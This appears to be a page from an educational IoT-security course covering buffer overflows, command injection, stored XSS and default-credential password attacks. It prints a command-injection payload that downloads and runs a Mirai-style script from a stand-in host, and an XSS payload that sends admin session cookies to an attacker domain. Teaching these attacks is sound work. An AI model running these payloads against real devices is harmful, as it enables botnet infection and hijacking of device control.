4.1 Software Exploit Mechanics on Stripped-Down Linux IoT OS

Interactive Lab

IoT devices have severely constrained RAM footprints. Drag the slider to increase input payload length beyond the 12-byte allocated input buffer and observe how excess bytes overwrite adjacent Execution Return Pointers (EIP/PC):

SAFE: Within Allocated Buffer
Bytes 00–11: Allocated Input Buffer Bytes 12–15: Execution Pointer / Program Code Corrupted Memory Overflow
Normal Execution: Input fits inside the 12-byte buffer. Adjacent execution pointers remain intact.

Mechanism & Impact

Mechanism: Unsanitized user inputs from configuration forms or APIs are passed directly into underlying system command interpreters (e.g., BusyBox /bin/sh).

Impact: Executes arbitrary system-level commands (downloading botnet binaries, adding root users) without administrative authorization.

// Vulnerable IoT Router Ping Utility
system("ping -c 1 " + user_ip_input);
// Malicious Attacker Payload:
127.0.0.1; wget http://evil.io/mirai.sh | sh
→ Shell executes ping AND downloads malware with root privileges!

Mechanism & Impact

Mechanism: Vulnerable web-based management interfaces embedded inside IP cameras, smart plugs, and home routers fail to escape HTML/JS input.

Impact: Injects malicious JavaScript into administrative web dashboards to steal session cookies, change DNS settings, or hijack device control sessions.

// Stored XSS in Camera Device Name Field
<script>fetch('https://attacker.io/steal?c='+document.cookie)</script>
→ Triggers whenever an admin opens the local device web portal.

4.2 Password Attacks & Credential Exploitation

~60% Password Reuse

Unmonitored Event Logs

Dictionary and brute-force attacks routinely succeed because constrained IoT devices lack logging, rate-limiting, and auditing mechanisms for failed login attempts.

Lifetime Default Configuration

Consumer and industrial IoT devices are commonly "installed once in a lifetime" with factory default credentials (e.g., admin/admin) left permanently intact.

~60% Password Reuse Risk

Studies show nearly 60% of users reuse the same password across multiple devices. Compromising one low-security IoT gadget grants lateral access across all network devices.
